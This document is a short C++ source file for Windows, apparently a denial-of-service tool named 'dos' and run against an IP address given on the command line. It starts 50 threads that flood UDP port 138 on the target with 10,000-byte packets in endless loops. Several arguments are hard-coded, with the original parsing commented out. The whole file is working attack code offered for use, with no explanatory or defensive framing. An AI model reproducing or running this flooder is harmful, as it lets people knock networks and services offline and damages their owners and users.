/*
use: ./dos 192.168.31.30 

*/


#include <winsock2.h>
#include <windows.h>
#include <cstdio>
#include <thread>
#include <vector>
#include <cstdlib>
#include <ctime> 
#pragma comment(lib, "ws2_32.lib")
using namespace std;
vector<thread> threads;
void udp(sockaddr * addr, char * txt, int lens) {
	SOCKET client = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	while (true) {
		sendto(client, txt, lens, 0, addr, sizeof(sockaddr));
	}
}
int get(const char * s) {
	int x;
	sscanf(s, "%d", &x);
	return x;
}
int main(const int argc, const char* argv[]) {
	srand((unsigned)time(NULL));
	WORD version;
	WSADATA wsadata;
	version = MAKEWORD(2, 2);
	if (WSAStartup(version, &wsadata) != 0) {
		return 0;
	};
	if (LOBYTE(wsadata.wVersion) != 2 || HIBYTE(wsadata.wHighVersion) != 2) {
		WSACleanup();
		return 0;
	}
	char *ip, txt[1000000];
	int port, len, thread_cnt, send_cnt;
	ip = (char *)argv[1];
	port = 138;//get(argv[2]);
	len = 1e4;//get(argv[3]);
	thread_cnt = 50;//get(argv[4]);
	// if (argc < 5) 
	send_cnt = -1;
	// // else 
	// send_cnt = get(argv[5]);
	for (int i = 0; i < len; i++) {
		txt[i] = '0';
	}
	txt[len] = '\0';
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.S_un.S_addr = inet_addr(ip);
	for (int i = 0; i < thread_cnt; i++) {
		thread(udp, (sockaddr *)&addr, txt, len).detach();
	}
	while (true);
	return 0;
}